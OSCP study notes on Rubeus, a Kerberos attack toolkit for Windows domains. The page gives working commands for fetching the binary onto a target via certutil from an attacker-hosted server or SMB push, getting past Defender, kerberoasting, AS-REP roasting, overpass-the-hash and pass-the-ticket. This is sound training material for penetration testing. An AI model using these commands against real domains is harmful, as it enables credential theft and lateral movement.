---
title: "Rubeus"
slug: rubeus
category: notes
handbook: oscp
tags: ["kerberos"]
draft: false
pubDatetime: 2026-08-01T10:35:17+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "Rubeus is the Windows-side Kerberos toolkit: it requests and abuses tickets from a domain-joined host, which is where the OSCP assumed breach starts (RDP as the foothold user)."
---
Rubeus is the Windows-side Kerberos toolkit: it requests and abuses tickets from a domain-joined host, which is where the OSCP assumed breach starts (RDP as the foothold user). It runs the same attacks impacket runs from Kali, but from inside the domain, so it needs no route from Kali to the DC and none of the `/etc/krb5.conf` realm plumbing that makes the Kali-over-Kerberos path fragile ([Kerberos Delegation](/collections/oscp/kerberos-delegation)). A single C# executable transferred to the target ([File Transfers](/collections/oscp/file-transfers)); like [Mimikatz](/collections/oscp/mimikatz) it is flagged by Defender, so the same AV handling applies.

Where it fits: [Kerberoasting](/collections/oscp/kerberoasting) and [AS-REP Roasting](/collections/oscp/as-rep-roasting) when the DC is not reachable from Kali, and overpass-the-hash / pass-the-ticket for [AD Lateral Movement](/collections/oscp/ad-lateral-movement).

## Get it onto the target

Rubeus ships as source, so grab a precompiled build. The Ghostpack compiled-binaries repo tracks releases; keep it with the transfer tools and serve it:

```bash
mkdir -p ~/OSCP/tools && cd ~/OSCP/tools
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
sudo python3 -m http.server 80
```

```cmd
:: target, cmd (admin shell)
certutil -urlcache -split -f http://KALI/Rubeus.exe C:\Windows\Temp\Rubeus.exe
```

Defender flags it like [Mimikatz](/collections/oscp/mimikatz), so the same exclusion-then-transfer handling applies ([File Transfers](/collections/oscp/file-transfers)). When the target has no route back to Kali (as on GOAD-Light), push it in over SMB with `nxc smb TARGET -u <admin> -H <hash> --put-file ./Rubeus.exe '\Windows\Temp\Rubeus.exe'` instead of pulling.

## Roasting

```
Rubeus.exe kerberoast /outfile:kerb.txt /nowrap            # every SPN account's TGS, hashcat-ready
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt   # every preauth-disabled account
```

`/nowrap` keeps each hash on one line so it copies out cleanly. Move the output to Kali and crack it exactly as the impacket hashes ([Kerberoasting](/collections/oscp/kerberoasting), [AS-REP Roasting](/collections/oscp/as-rep-roasting)).

## Overpass-the-hash (NT hash to a TGT)

Turn an NT hash into a real Kerberos TGT and inject it into the current session, so a Kerberos-only target (reached by hostname) accepts it where plain pass-the-hash cannot:

```
Rubeus.exe asktgt /user:jeffadmin /rc4:<NThash> /ptt
```

`/ptt` loads the TGT straight into memory; drop it to print the base64 ticket to the console, and add `/outfile:<file.kirbi>` to write a `.kirbi` file instead. `/aes256:<key>` is quieter than `/rc4:` when the AES key is available. After it, `dir \\dc01.corp.com\c$` and other hostname-based commands authenticate as that user.

## Pass-the-ticket

Reuse a ticket already in memory (exported by [Mimikatz](/collections/oscp/mimikatz) `sekurlsa::tickets /export`, or by Rubeus itself):

```
Rubeus.exe triage                     # table of cached tickets and their LUIDs
Rubeus.exe dump /nowrap               # the tickets themselves, base64
Rubeus.exe ptt /ticket:<.kirbi | base64 blob>
```
